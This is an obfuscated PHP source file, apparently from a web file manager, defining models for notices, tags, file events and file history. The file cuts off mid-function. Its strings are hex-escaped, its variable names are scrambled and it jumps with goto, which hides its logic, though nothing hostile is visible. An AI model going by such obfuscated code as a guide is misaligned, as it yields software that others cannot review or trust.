<?php
 goto e×™µƒÂç ; dá¨ƒå°’ó: class SystemNoticeModel extends ModelBaseLight { public $optionType = "\123\171\x73\164\145\155\56\x6e\x6f\164\x69\x63\145\114\x69\163\164"; public $field = array("\x6e\x61\x6d\145", "\x63\x6f\x6e\x74\145\156\x74", "\x61\x75\x74\x68", "\155\157\x64\x65", "\x74\x69\155\x65", "\164\x79\160\x65", "\x6c\x65\x76\x65\154", "\x65\x6e\141\142\x6c\x65", "\x73\x6f\162\164"); public function listData($·ì¨„Ô³ = false, $ÖêÙà¯ = "\163\x6f\x72\164", $è®ŒßİÅ = false) { return parent::listData($·ì¨„Ô³, $ÖêÙà¯, $è®ŒßİÅ); } public function add($ûãµÛñœ) { $“›‡€ƒ® =& $_SERVER[¤øïŠ‹²]; $‘ ”˜›å = time(); if ($ûãµÛñœ[$“›‡€ƒ®[16]] == $“›‡€ƒ®[2609]) { $‘ ”˜›å = strtotime($ûãµÛñœ[$“›‡€ƒ®[217]]); } $ûãµÛñœ[$“›‡€ƒ®[217]] = $‘ ”˜›å; return parent::insert($ûãµÛñœ); } public function update($®§âöÈ, $êşÆöÕ) { $¥Şüô£» =& $_SERVER[¤øïŠ‹²]; $°æ¨×‰î = $this->listData($®§âöÈ); if (!$°æ¨×‰î) { return !1; } $¥ê‰¼õå = time(); if ($êşÆöÕ[$¥Şüô£»[16]] == $¥Şüô£»[2609]) { $¥ê‰¼õå = strtotime($êşÆöÕ[$¥Şüô£»[217]]); } $êşÆöÕ[$¥Şüô£»[217]] = $¥ê‰¼õå; return parent::update($®§âöÈ, $êşÆöÕ); } public function remove($Úºê÷ ) { $ÅÆãåş† = $this->listData($Úºê÷ ); if (!$ÅÆãåş† || $ÅÆãåş†[$_SERVER[¤øïŠ‹²][202]]) { return !1; } return parent::remove($Úºê÷ ); } public function sort($²ï¿Šê°, $ãÑªÂ®) { return parent::update($²ï¿Šê°, $ãÑªÂ®); } public function enable($‹°ìñªß, $Æ›­Îš‡) { return parent::update($‹°ìñªß, array($_SERVER[¤øïŠ‹²][2610] => $Æ›­Îš‡)); } private function initUserOption() { $ÅÎ“¿Ü =& $_SERVER[¤øïŠ‹²]; $this->optionType = $ÅÎ“¿Ü[2611]; $this->modelType = $ÅÎ“¿Ü[2612]; $this->field = array($ÅÎ“¿Ü[2613], $ÅÎ“¿Ü[32], $ÅÎ“¿Ü[217], $ÅÎ“¿Ü[33], $ÅÎ“¿Ü[2614], $ÅÎ“¿Ü[851], $ÅÎ“¿Ü[239]); } public function userNoticeGet($Í‘Ÿù¨Ğ = false) { $this->initUserOption(); return parent::listData($Í‘Ÿù¨Ğ, $_SERVER[¤øïŠ‹²][493], !0); } public function userNoticeAdd($íÅ™ ‰é) { $§é«ç‘ü =& $_SERVER[¤øïŠ‹²]; $this->initUserOption(); $¶ºŠƒÏù = $this->findByKey($§é«ç‘ü[2613], $íÅ™ ‰é[$§é«ç‘ü[493]]); if ($¶ºŠƒÏù) { return !0; } $¼ä±Ãïß = array($§é«ç‘ü[2613] => $íÅ™ ‰é[$§é«ç‘ü[493]], $§é«ç‘ü[32] => $íÅ™ ‰é[$§é«ç‘ü[32]], $§é«ç‘ü[217] => $íÅ™ ‰é[$§é«ç‘ü[217]], $§é«ç‘ü[33] => isset($íÅ™ ‰é[$§é«ç‘ü[33]]) ? $íÅ™ ‰é[$§é«ç‘ü[33]] : 1, $§é«ç‘ü[2614] => isset($íÅ™ ‰é[$§é«ç‘ü[2614]]) ? $íÅ™ ‰é[$§é«ç‘ü[2614]] : 0, $§é«ç‘ü[851] => 0, $§é«ç‘ü[239] => 0); return parent::insert($¼ä±Ãïß); } public function userNoticeEdit($èš¸æıŒ, $¬ğ°ñ¯Õ) { $this->initUserOption(); return parent::update($èš¸æıŒ, $¬ğ°ñ¯Õ); } } class SystemOptionModel extends ModelBaseOption { protected $tableName = "\x73\x79\x73\164\x65\x6d\137\157\x70\164\151\157\156"; protected $jsonField = array("\x6d\x65\156\165", "\162\157\x6c\x65", "\162\x6f\154\x65\107\162\157\165\160", "\162\x65\147\x69\x73\x74", "\145\x6d\141\151\x6c"); function __construct() { parent::__construct(); } protected function cacheKey($¸ë‚¡”Á) { return "\x53\171\163\164\x65\x6d\117\160\x74\151\x6f\156\137{$¸ë‚¡”Á}"; } protected function optionDefault($²ãÓº›À = '') { $å¶¥‹çº =& $_SERVER[¤øïŠ‹²]; if ($²ãÓº›À == $å¶¥‹çº[12]) { return $GLOBALS[$å¶¥‹çº[6]][$å¶¥‹çº[478]]; } } } class SystemRecordModel extends ModelBaseLight { } goto dÚóêĞêÃ; dË„Ğ±½ç: class UserTagModel extends ModelBaseLight { public $optionType = "\x55\x73\x65\x72\x2e\x74\x61\x67\x4c\151\163\x74"; public $modelType = "\x55\x73\x65\162\117\160\164\x69\x6f\x6e"; public $field = array("\x6e\141\155\145", "\163\x74\x79\x6c\145", "\x73\x6f\162\164"); public function listData($´ùû×¦ = false, $¢ì£İãü = "\x73\157\162\164", $Üˆı¦Â = false) { return parent::listData($´ùû×¦, $¢ì£İãü, $Üˆı¦Â); } public function remove($œ ƒÂÌí) { return parent::remove($œ ƒÂÌí); } public function add($Ë–‹ÅÕâ, $˜æĞ—€Õ = "\154\141\x62\145\x6c\55\147\162\145\x79\x2d\156\157\162\x6d\141\154") { $ÙØÑàï =& $_SERVER[¤øïŠ‹²]; if ($this->findByName($Ë–‹ÅÕâ)) { return !1; } $Úƒ‘ŸÌ = array($ÙØÑàï[515] => $Ë–‹ÅÕâ, $ÙØÑàï[580] => $˜æĞ—€Õ, $ÙØÑàï[2135] => $this->getSort($ÙØÑàï[347]) + 1); return parent::insert($Úƒ‘ŸÌ); } public function update($×æ¸¶›—, $Ç—¡™ä¶) { $Õğó™Âı =& $_SERVER[¤øïŠ‹²]; $åËæï¶Ø = $this->listData($×æ¸¶›—); $Üİ›áÌ = $this->findByName($Ç—¡™ä¶[$Õğó™Âı[32]]); if (!$åËæï¶Ø || $Üİ›áÌ && $Üİ›áÌ[$Õğó™Âı[493]] != $åËæï¶Ø[$Õğó™Âı[493]]) { return !1; } return parent::update($×æ¸¶›—, $Ç—¡™ä¶); } public function moveTop($«ö­Ğƒç) { $ØÕÁ˜Ø =& $_SERVER[¤øïŠ‹²]; $”·ûŠÍ± = parent::listData(); $Ü®À¦µ­ = $this->getSort($ØÕÁ˜Ø[346]); foreach ($”·ûŠÍ± as &$­«„ª»ñ) { if ($­«„ª»ñ[$ØÕÁ˜Ø[493]] == $«ö­Ğƒç) { $­«„ª»ñ[$ØÕÁ˜Ø[2153]] = $Ü®À¦µ­; continue; } $­«„ª»ñ[$ØÕÁ˜Ø[2153]] += 1; } unset($­«„ª»ñ); return parent::resetData($”·ûŠÍ±); } public function moveBottom($§ûà§„ı) { $ó¹ŠŠ‡… =& $_SERVER[¤øïŠ‹²]; $Øíø©³ = $this->getSort($ó¹ŠŠ‡…[347]) + 1; return parent::update($§ûà§„ı, array($ó¹ŠŠ‡…[2153] => $Øíø©³)); } public function resetSort($éá°™Ë) { $ó‡Ñ…š¹ =& $_SERVER[¤øïŠ‹²]; $­Í™îƒµ = array(); $éá°™Ë = is_array($éá°™Ë) ? $éá°™Ë : array(); for ($¤˜óã£ó = 0; $¤˜óã£ó < count($éá°™Ë); $¤˜óã£ó++) { $­Í™îƒµ[$éá°™Ë[$¤˜óã£ó] . $ó‡Ñ…š¹[12]] = $¤˜óã£ó + 1; } $›ÔÔúÉ = parent::listData(); foreach ($›ÔÔúÉ as &$İº²íø…) { $äºÂªÎ = $­Í™îƒµ[$İº²íø…[$ó‡Ñ…š¹[493]]]; $İº²íø…[$ó‡Ñ…š¹[2153]] = $äºÂªÎ ? $äºÂªÎ : $İº²íø…[$ó‡Ñ…š¹[2153]]; } unset($İº²íø…); return parent::resetData($›ÔÔúÉ); } private function getSort($æ½¶°Æš) { $ïº ¨ª =& $_SERVER[¤øïŠ‹²]; $ìº£“±¸ = parent::listData(); $çµ°º­± = array_to_keyvalue($ìº£“±¸, $ïº ¨ª[12], $ïº ¨ª[2153]); if (!$çµ°º­±) { $çµ°º­± = array(0); } $’ä¦™ÏË = $æ½¶°Æš == $ïº ¨ª[347] ? max($çµ°º­±) : min($çµ°º­±); return intval($’ä¦™ÏË); } } goto Aøù¯ÜÂã£; b³ÖÂìæÌö: class SourceEventModel extends ModelBase { protected $tableName = "\151\157\137\163\157\x75\162\x63\145\137\x65\166\145\x6e\164"; protected $dataAuto = array(array("\x63\x72\145\141\164\x65\124\x69\155\145", "\164\151\x6d\x65", "\x69\x6e\x73\145\162\164", "\146\x75\x6e\143\164\x69\x6f\x6e"), array("\144\x65\x73\143", '', "\151\x6e\163\145\x72\164\54\x75\160\144\141\164\x65\x2c\163\145\154\145\x63\x74", "\152\x73\157\x6e")); protected $eventSave = true; public function recodeStop() { $this->eventSave = !1; } public function recodeStart() { $this->eventSave = !0; } public function addEvent($’¶¿˜€š, $ß¡”Èèƒ, $Âö–úó = '') { $ì¼€‰¬§ =& $_SERVER[¤øïŠ‹²]; if (!$this->eventSave) { return; } $Åº ÙÖá = Model($ì¼€‰¬§[1482])->sourceInfo($’¶¿˜€š); if (!$Åº ÙÖá) { return !1; } if ($this->isDisableEvent($Åº ÙÖá, $ß¡”Èèƒ)) { return; } if ($Âö–úó && is_string($Âö–úó)) { $Âö–úó = array($ì¼€‰¬§[2169] => $Âö–úó); } $ò»ÑÄêŒ = KodUser::id(); $ˆš “íÈ = array($ì¼€‰¬§[512] => $’¶¿˜€š, $ì¼€‰¬§[2360] => $Åº ÙÖá[$ì¼€‰¬§[203]], $ì¼€‰¬§[2361] => $Åº ÙÖá[$ì¼€‰¬§[32]], $ì¼€‰¬§[608] => !empty($Åº ÙÖá[$ì¼€‰¬§[608]]) ? $Åº ÙÖá[$ì¼€‰¬§[608]] : $ì¼€‰¬§[12], $ì¼€‰¬§[1916] => $ò»ÑÄêŒ, $ì¼€‰¬§[517] => $ß¡”Èèƒ, $ì¼€‰¬§[1918] => $Âö–úó); $this->addSystemLog($ß¡”Èèƒ, $ˆš “íÈ); unset($ˆš “íÈ[$ì¼€‰¬§[2361]], $ˆš “íÈ[$ì¼€‰¬§[608]]); return $this->add($ˆš “íÈ); } private function addSystemLog($ıÒ«Ãõ×, $ºÈĞ¨­») { $‚ÇÕ±ô =& $_SERVER[¤øïŠ‹²]; if ($ıÒ«Ãõ× == $‚ÇÕ±ô[2362]) { $ıÒ«Ãõ× = $ºÈĞ¨­»[$‚ÇÕ±ô[546]][$‚ÇÕ±ô[2363]]; } else { if (in_array($ıÒ«Ãõ×, array($‚ÇÕ±ô[1512], $‚ÇÕ±ô[2364]))) { $ıÒ«Ãõ× = $ºÈĞ¨­»[$‚ÇÕ±ô[546]][$‚ÇÕ±ô[181]]; } } $Ÿƒö«¿Î = array_merge($ºÈĞ¨­», array($‚ÇÕ±ô[2365] => $ºÈĞ¨­»[$‚ÇÕ±ô[204]], $‚ÇÕ±ô[2366] => $ºÈĞ¨­»[$‚ÇÕ±ô[2366]])); Hook::trigger($‚ÇÕ±ô[2367], $‚ÇÕ±ô[2368] . $ıÒ«Ãõ×, $ºÈĞ¨­»); Model($‚ÇÕ±ô[2078])->addLog($‚ÇÕ±ô[2368] . $ıÒ«Ãõ×, $Ÿƒö«¿Î); } private function isDisableEvent($½›‘ˆ§Ç, $¢÷¬¡ºâ) { $¾šÃÔÌ­ =& $_SERVER[¤øïŠ‹²]; if ($½›‘ˆ§Ç[$¾šÃÔÌ­[201]] != SourceModel::TYPE_SYSTEM) { return !1; } if ($¢÷¬¡ºâ == $¾šÃÔÌ­[1280]) { return !1; } return !0; } public function eventCreate($Ã†…Èµ›, $‡¶ßßğù) { $§ìë²”º =& $_SERVER[¤øïŠ‹²]; $ËÍË¾ÖÜ = Model($§ìë²”º[1482])->sourceInfo($Ã†…Èµ›); $ñ­÷’ó = array($§ìë²”º[2363] => $‡¶ßßğù, $§ìë²”º[32] => $ËÍË¾ÖÜ[$§ìë²”º[32]]); return $this->addEvent($Ã†…Èµ›, $§ìë²”º[2362], $ñ­÷’ó); } public function eventFileEdit($™È˜ŞÅ) { $³à× ‹ğ =& $_SERVER[¤øïŠ‹²]; $¾±©Èßü = array($³à× ‹ğ[2369] => $_SERVER[$³à× ‹ğ[2370]], $³à× ‹ğ[2371] => strtolower(ACTION)); if (isset($GLOBALS[$³à× ‹ğ[7]][$³à× ‹ğ[1572]])) { $¾±©Èßü[$³à× ‹ğ[1572]] = $³à× ‹ğ[102]; } return $this->addEvent($™È˜ŞÅ, $³à× ‹ğ[1511], $¾±©Èßü); } public function eventRecycle($¾–ªÇ¯Ü, $å»Ö³Â”) { return $this->addEvent($¾–ªÇ¯Ü, $_SERVER[¤øïŠ‹²][2364], $å»Ö³Â”); } private static $_removeLast = ''; public function eventRemove($¨‘êÄûÚ) { $¯Õ°…Ø =& $_SERVER[¤øïŠ‹²]; self::$_removeLast = $¨‘êÄûÚ; $‚¡‹™¡ = Model($¯Õ°…Ø[1482])->sourceInfo($¨‘êÄûÚ); $¹´¦Š…à = array_field_key($‚¡‹™¡, array($¯Õ°…Ø[204], $¯Õ°…Ø[563], $¯Õ°…Ø[526], $¯Õ°…Ø[610])); $åçşíŞ× = array($¯Õ°…Ø[181] => $‚¡‹™¡[$¯Õ°…Ø[32]], $¯Õ°…Ø[2371] => ACTION, $¯Õ°…Ø[2372] => $¹´¦Š…à); return $this->addEvent($‚¡‹™¡[$¯Õ°…Ø[203]], $¯Õ°…Ø[1280], $åçşíŞ×); } public function eventShare($ıßŠ…Õ±, $Áö¼Ó ¨) { return $this->addEvent($ıßŠ…Õ±, $_SERVER[¤øïŠ‹²][1512], $Áö¼Ó ¨); } public function eventMove($Š»«‚õ¦, $Ñ§ÁÇº™, $ŒˆøÅ±) { $»ˆÛıÇ =& $_SERVER[¤øïŠ‹²]; if (self::$_removeLast == $Š»«‚õ¦) { return; } $œ¸„ Æ¾ = Model($»ˆÛıÇ[1482]); $Ø–íéÄÉ = $œ¸„ Æ¾->sourceInfo($Š»«‚õ¦); $ˆ‰ø¾ÛË = $œ¸„ Æ¾->sourceInfo($Ñ§ÁÇº™); $û×ÊÌâí = $œ¸„ Æ¾->sourceInfo($ŒˆøÅ±); $±ÙÃÇ× = array($»ˆÛıÇ[1292] => $Ñ§ÁÇº™, $»ˆÛıÇ[2373] => $ˆ‰ø¾ÛË[$»ˆÛıÇ[32]], $»ˆÛıÇ[2331] => !empty($ˆ‰ø¾ÛË[$»ˆÛıÇ[608]]) ? $ˆ‰ø¾ÛË[$»ˆÛıÇ[608]] : $»ˆÛıÇ[12], $»ˆÛıÇ[1293] => $ŒˆøÅ±, $»ˆÛıÇ[2374] => $û×ÊÌâí[$»ˆÛıÇ[32]], $»ˆÛıÇ[2375] => !empty($û×ÊÌâí[$»ˆÛıÇ[608]]) ? $û×ÊÌâí[$»ˆÛıÇ[608]] : $»ˆÛıÇ[12]); $this->addEvent($Š»«‚õ¦, $»ˆÛıÇ[649], $±ÙÃÇ×); $Ø–íéÄÉ = $œ¸„ Æ¾->sourceInfo($Š»«‚õ¦); $±ÙÃÇ× = array($»ˆÛıÇ[204] => $Ø–íéÄÉ[$»ˆÛıÇ[204]], $»ˆÛıÇ[32] => $Ø–íéÄÉ[$»ˆÛıÇ[32]]); $this->addEvent($Ñ§ÁÇº™, $»ˆÛıÇ[2376], $±ÙÃÇ×); } public function eventCopy($ğ’Ç½ã) { $this->eventCreate($ğ’Ç½ã, $_SERVER[¤øïŠ‹²][647]); } public function eventRename($íµ €ôë, $±€×§ ø, $õÑ—ÒÚ¯) { $¤—‘ =& $_SERVER[¤øïŠ‹²]; $×üÅ©­â = array($¤—‘[1292] => $±€×§ ø, $¤—‘[1293] => $õÑ—ÒÚ¯); return $this->addEvent($íµ €ôë, $¤—‘[1496], $×üÅ©­â); } public function eventAddComment($´ÛšıÌµ, $‹ó‹„»Ë) { return $this->addEvent($´ÛšıÌµ, $_SERVER[¤øïŠ‹²][2377], $‹ó‹„»Ë); } public function eventAddDesc($½Ÿºˆ«À, $©¯î¡£©) { return $this->addEvent($½Ÿºˆ«À, $_SERVER[¤øïŠ‹²][2378], $©¯î¡£©); } public function listBySource($¤Ğ›”ÏË) { $­£ˆĞ¤ñ =& $_SERVER[¤øïŠ‹²]; $ÖŠ†İ Ç = Model($­£ˆĞ¤ñ[1482])->sourceInfo($¤Ğ›”ÏË); $«üïÛ© = array($­£ˆĞ¤ñ[512] => $¤Ğ›”ÏË); if ($ÖŠ†İ Ç[$­£ˆĞ¤ñ[506]] == $­£ˆĞ¤ñ[102]) { $·õÑû¤¢ = Model($­£ˆĞ¤ñ[1482])->listSearchChildren($¤Ğ›”ÏË, 20000); $·õÑû¤¢[] = $¤Ğ›”ÏË . $­£ˆĞ¤ñ[63]; $«üïÛ© = array($­£ˆĞ¤ñ[204] => array($­£ˆĞ¤ñ[7], $·õÑû¤¢)); } $Øõ€™Ò = $this->where($«üïÛ©)->order($­£ˆĞ¤ñ[2379])->selectPage(); if ($Øõ€™Ò[$­£ˆĞ¤ñ[454]][$­£ˆĞ¤ñ[455]] == 0) { $Øõ€™Ò[$­£ˆĞ¤ñ[454]][$­£ˆĞ¤ñ[455]] = 1; $Øõ€™Ò[$­£ˆĞ¤ñ[457]] = array(array($­£ˆĞ¤ñ[512] => $¤Ğ›”ÏË, $­£ˆĞ¤ñ[2360] => $ÖŠ†İ Ç[$­£ˆĞ¤ñ[203]], $­£ˆĞ¤ñ[1916] => $ÖŠ†İ Ç[$­£ˆĞ¤ñ[547]], $­£ˆĞ¤ñ[517] => $­£ˆĞ¤ñ[2380], $­£ˆĞ¤ñ[518] => $ÖŠ†İ Ç[$­£ˆĞ¤ñ[244]], $­£ˆĞ¤ñ[1918] => $­£ˆĞ¤ñ[12])); } return $this->eventListParse($Øõ€™Ò, $¤Ğ›”ÏË); } private function eventListParse($Ÿ´±î¨, $àó¼ß) { $¤ìÏÑˆ· =& $_SERVER[¤øïŠ‹²]; $ü‡ÈíÇà = $Ÿ´±î¨[$¤ìÏÑˆ·[457]]; $ıŒŸİü = array_to_keyvalue($ü‡ÈíÇà, $¤ìÏÑˆ·[12], $¤ìÏÑˆ·[204]); $¡ù¸ª‚Š = array_to_keyvalue($ü‡ÈíÇà, $¤ìÏÑˆ·[12], $¤ìÏÑˆ·[2366]); foreach ($ü‡ÈíÇà as $Ç¥¡ÆÖæ) { $œÊÎŞá = $Ç¥¡ÆÖæ[$¤ìÏÑˆ·[546]]; if ($Ç¥¡ÆÖæ[$¤ìÏÑˆ·[33]] == $¤ìÏÑˆ·[649] && isset($œÊÎŞá[$¤ìÏÑˆ·[1292]])) { $ıŒŸİü[] = $œÊÎŞá[$¤ìÏÑˆ·[1292]] . $¤ìÏÑˆ·[12]; $ıŒŸİü[] = $œÊÎŞá[$¤ìÏÑˆ·[1293]] . $¤ìÏÑˆ·[12]; } if ($Ç¥¡ÆÖæ[$¤ìÏÑˆ·[33]] == $¤ìÏÑˆ·[2376] && isset($œÊÎŞá[$¤ìÏÑˆ·[204]])) { $ıŒŸİü[] = $œÊÎŞá[$¤ìÏÑˆ·[204]] . $¤ìÏÑˆ·[12]; } } $ıŒŸİü = array_merge($ıŒŸİü, $¡ù¸ª‚Š, array($àó¼ß . $¤ìÏÑˆ·[12])); $ıŒŸİü = array_unique($ıŒŸİü); $©õû¹Îµ = array_unique(array_to_keyvalue($ü‡ÈíÇà, $¤ìÏÑˆ·[12], $¤ìÏÑˆ·[1542])); $´Û…ÀÀ› = Model($¤ìÏÑˆ·[623])->userListInfo($©õû¹Îµ); $Õñ¢‹Ü = Model($¤ìÏÑˆ·[934])->sourceListInfo($ıŒŸİü, !0); foreach ($ü‡ÈíÇà as &$Ç¥¡ÆÖæ) { if ($Ç¥¡ÆÖæ[$¤ìÏÑˆ·[33]] == $¤ìÏÑˆ·[649] && isset($Ç¥¡ÆÖæ[$¤ìÏÑˆ·[546]][$¤ìÏÑˆ·[1292]])) { $Ç¥¡ÆÖæ[$¤ìÏÑˆ·[546]][$¤ìÏÑˆ·[1292]] = $Õñ¢‹Ü[$Ç¥¡ÆÖæ[$¤ìÏÑˆ·[546]][$¤ìÏÑˆ·[1292]]]; $Ç¥¡ÆÖæ[$¤ìÏÑˆ·[546]][$¤ìÏÑˆ·[1293]] = $Õñ¢‹Ü[$Ç¥¡ÆÖæ[$¤ìÏÑˆ·[546]][$¤ìÏÑˆ·[1293]]]; } if ($Ç¥¡ÆÖæ[$¤ìÏÑˆ·[33]] == $¤ìÏÑˆ·[2376] && isset($Ç¥¡ÆÖæ[$¤ìÏÑˆ·[546]][$¤ìÏÑˆ·[204]])) { $Ç¥¡ÆÖæ[$¤ìÏÑˆ·[546]][$¤ìÏÑˆ·[204]] = $Õñ¢‹Ü[$Ç¥¡ÆÖæ[$¤ìÏÑˆ·[546]][$¤ìÏÑˆ·[204]]]; } $Ç¥¡ÆÖæ[$¤ìÏÑˆ·[101]] = $Õñ¢‹Ü[$Ç¥¡ÆÖæ[$¤ìÏÑˆ·[204]]]; $Ç¥¡ÆÖæ[$¤ìÏÑˆ·[2381]] = $Õñ¢‹Ü[$Ç¥¡ÆÖæ[$¤ìÏÑˆ·[2366]]]; if ($Ç¥¡ÆÖæ[$¤ìÏÑˆ·[33]] == $¤ìÏÑˆ·[1280]) { $Ç¥¡ÆÖæ[$¤ìÏÑˆ·[2381]] = $Ç¥¡ÆÖæ[$¤ìÏÑˆ·[101]]; $Ç¥¡ÆÖæ[$¤ìÏÑˆ·[2366]] = $Ç¥¡ÆÖæ[$¤ìÏÑˆ·[2381]][$¤ìÏÑˆ·[204]]; $Ç¥¡ÆÖæ[$¤ìÏÑˆ·[101]] = !1; $Ç¥¡ÆÖæ[$¤ìÏÑˆ·[204]] = $¤ìÏÑˆ·[12]; } $Ç¥¡ÆÖæ[$¤ìÏÑˆ·[2305]] = $´Û…ÀÀ›[$Ç¥¡ÆÖæ[$¤ìÏÑˆ·[1542]]]; } unset($Ç¥¡ÆÖæ); $Ÿ´±î¨[$¤ìÏÑˆ·[457]] = $ü‡ÈíÇà; return $Ÿ´±î¨; } public function removeBySource($…øá„×¼) { $•¶œ…“ = array($_SERVER[¤øïŠ‹²][512] => $…øá„×¼); $this->where($•¶œ…“)->remove(); } } class SourceHistoryModel extends ModelBase { protected $tableName = "\151\157\137\163\157\165\x72\143\145\x5f\150\151\x73\164\x6f\162\x79"; public function historyCount($¡Œ­“‰) { $¿µ¯Ÿü =& $_SERVER[¤øïŠ‹²]; if (!$¡Œ­“‰) { return array(); } if (is_string($¡Œ­“‰) || is_int($¡Œ­“‰)) { $¡Œ­“‰ = array($¡Œ­“‰); } $§ÖÊêŸ = array($¿µ¯Ÿü[204], $¿µ¯Ÿü[2382] => $¿µ¯Ÿü[591]); $±ëª¥ô¿ = array($¿µ¯Ÿü[204] => array($¿µ¯Ÿü[7], $¡Œ­“‰)); $˜…º‡¦› = $this->field($§ÖÊêŸ)->where($±ëª¥ô¿)->group($¿µ¯Ÿü[204])->select(); return array_to_keyvalue($˜…º‡¦›, $¿µ¯Ÿü[204], $¿µ¯Ÿü[591]); } public function addHistory($‰Åˆ¡Í¾, $¥ùÕÆ£¡ = '') { $ÕÔÉÍ… =& $_SERVER[¤øïŠ‹²]; $¬ĞÅÌÜ = array($ÕÔÉÍ…[512] => $‰Åˆ¡Í¾[$ÕÔÉÍ…[204]], $ÕÔÉÍ…[1916] => isset($‰Åˆ¡Í¾[$ÕÔÉÍ…[549]]) ? $‰Åˆ¡Í¾[$ÕÔÉÍ…[549]] : $‰Åˆ¡Í¾[$ÕÔÉÍ…[547]], $ÕÔÉÍ…[564] => $‰Åˆ¡Í¾[$ÕÔÉÍ…[563]], $ÕÔÉÍ…[646] => $‰Åˆ¡Í¾[$ÕÔÉÍ…[90]], $ÕÔÉÍ…[2383] => $¥ùÕÆ£¡); if ($GLOBALS[$ÕÔÉÍ…[6]][$ÕÔÉÍ…[103]][$ÕÔÉÍ…[1354]] >= 1) { $this->historyAutoClear($¬ĞÅÌÜ[$ÕÔÉÍ…[204]]); $this->add($¬ĞÅÌÜ); } Hook::trigger($ÕÔÉÍ…[2384], $¬ĞÅÌÜ); Model($ÕÔÉÍ…[2385])->eventFileEdit($‰Åˆ¡Í¾[$ÕÔÉÍ…[204]]); } private function historyAutoClear($£ÆÊÏçƒ) { $Ïéü«ê =& $_SERVER[¤øïŠ‹²]; $æü‚ù¥Ö = Model($Ïéü«ê[874])->get($Ïéü«ê[1376]); $ÅÀğåã = intval($GLOBALS[$Ïéü«ê[6]][$Ïéü«ê[103]][$Ïéü«ê[1354]]); $ù¢ìŞ™Õ = $æü‚ù¥Ö == $Ïéü«ê[1377] ? min(5, $ÅÀğåã) : $ÅÀğåã; $ù¢ìŞ™Õ = $ù¢ìŞ™Õ <= 0 ? 0 : $ù¢ìŞ™Õ - 1; if ($ù¢ìŞ™Õ >= 499) { return; } $üÂƒ´œÌ = array($Ïéü«ê[512] => $£ÆÊÏçƒ); $œô»†Õ = $this->field($Ïéü«ê[2386])->where($üÂƒ´œÌ)->order($Ïéü«ê[2379])->select(); if (!$œô»†Õ || $ù¢ìŞ™Õ >= count($œô»†Õ)) { return; } $ôú¨åŒü = array_to_keyvalue($œô»†Õ, $Ïéü«ê[12], $Ïéü«ê[493]); $ôú¨åŒü = array_slice($ôú¨åŒü, $ù¢ìŞ™Õ); $…—‡£ß¾ = array_to_keyvalue($œô»†Õ, $Ïéü«ê[12], $Ïéü«ê[563]); $…—‡£ß¾ = array_slice($…—‡£ß¾, $ù¢ìŞ™Õ); if (!$ôú¨åŒü || !$…—‡£ß¾) { return; } $üÂƒ´œÌ = array($Ïéü«ê[514] => array($Ïéü«ê[7], $ôú¨åŒü)); $this->where($üÂƒ´œÌ)->delete(); Model($Ïéü«ê[566])->remove($…—‡£ß¾); } public function listData($ûüæÊğÜ) { $ËÌˆ÷™ =& $_SERVER[¤øïŠ‹²]; $´á¡´ˆ» = array($ËÌˆ÷™[512] => $ûüæÊğÜ); $É¯æ¤ßË = $ËÌˆ÷™[2387]; $ê–©õÆÁ = $this->field($É¯æ¤ßË)->where($´á¡´ˆ»)->order($ËÌˆ÷™[2379])->selectPage(); $this->_listAppendUser($ê–©õÆÁ[$ËÌˆ÷™[457]]); $Ù÷ñÌµ˜ = Model($ËÌˆ÷™[874])->get($ËÌˆ÷™[1376]); $·§³¾ˆ… = 5; if ($Ù÷ñÌµ˜ == $ËÌˆ÷™[1377]) { $ê–©õÆÁ[$ËÌˆ÷™[457]] = array_slice($ê–©õÆÁ[$ËÌˆ÷™[457]], 0, $·§³¾ˆ…); $ê–©õÆÁ[$ËÌˆ÷™[454]] = array($ËÌˆ÷™[2388] => 1, $ËÌˆ÷™[2389] => 20, $ËÌˆ÷™[2390] => 1, $ËÌˆ÷™[2391] => count($ê–©õÆÁ[$ËÌˆ÷™[457]])); } return $ê–©õÆÁ; } protected function _listAppendUser(&$û—Ë¯¿Ô) { $é‰­•± =& $_SERVER[¤øïŠ‹²]; $ …É¼•ğ = array_to_keyvalue($û—Ë¯¿Ô, $é‰­•±[12], $é‰­•±[1542]); $Ö¢õò†à = Model($é‰­•±[623])->userListInfo($ …É¼•ğ); foreach ($û—Ë¯¿Ô as &$“Ğ³à) { $çêÀ®ë‚ = $“Ğ³à[$é‰­•±[1542]]; $“Ğ³à[$é‰­•±[547]] = $Ö¢õò†à[$çêÀ®ë‚] ? $Ö¢õò†à[$çêÀ®ë‚] : !1; } unset($“Ğ³à); } public function fileInfo($¡ùÅøõà, $öûê¸”… = false) { $úµâ­ÊË =& $_SERVER[¤øïŠ‹²]; $Ñ»Ï“Óˆ = $this->tablePrefix; $¸„ªÁ’õ = "{$Ñ»Ï“Óˆ}\x69\157\x5f\x66\x69\154\x65\x20\146\x69\x6c\x65\x73\40\x6f\x6e\x20\146\x69\154\x65\163\56\146\151\154\145\x49\104\40\75\x20\x68\x69\163\x74\x6f\x72\171\x2e\x66\x69\154\x65\x49\x44"; $»Ì«À€¹ = $this->alias($úµâ­ÊË[2392])->where(array($úµâ­ÊË[514] => $¡ùÅøõà))->join($¸„ªÁ’õ, $úµâ­ÊË[2393])->find(); if ($»Ì«À€¹ && $öûê¸”…) { $›•Ø› = array($úµâ­ÊË[204] => $»Ì«À€¹[$úµâ­ÊË[204]], $úµâ­ÊË[493] => array($úµâ­ÊË[1129], $¡ùÅøõà)); $»Ì«À€¹[$úµâ­ÊË[1812]] = $this->where($›•Ø›)->count(); } return $»Ì«À€¹; } public function removeItem($ÊùÇ”Äæ) { $ĞÏîçÎ =& $_SERVER[¤øïŠ‹²]; $„»“¥Â± = array($ĞÏîçÎ[514] => $ÊùÇ”Äæ); $ŞÄèÈËµ = $this->where($„»“¥Â±)->find(); if ($ŞÄèÈËµ) { $Ê“’Øúâ = $this->where($„»“¥Â±)->delete(); Model($ĞÏîçÎ[566])->remove($ŞÄèÈËµ[$ĞÏîçÎ[563]]); return $Ê“’Øúâ; } return !1; } public function removeBySource($—í) { $®’ÑšŸ =& $_SERVER[¤øïŠ‹²]; if (!$—í) { return !1; } if (!is_array($—í)) { $—í = array($—í); } $­ÂÂ Ú = array($®’ÑšŸ[512] => array($®’ÑšŸ[7], $—í)); $Êã­Ôéâ = $this->field($®’ÑšŸ[564])->where($­ÂÂ Ú)->select(); if ($Êã­Ôéâ) { $this->where($­ÂÂ Ú)->delete(); $¡ÓÒ¤ş = array_to_keyvalue($Êã­Ôéâ, $®’ÑšŸ[12], $®’ÑšŸ[563]); Model($®’ÑšŸ[566])->remove($¡ÓÒ¤ş); } return !0; } public function setDetail($ìİ¹¦¦È, 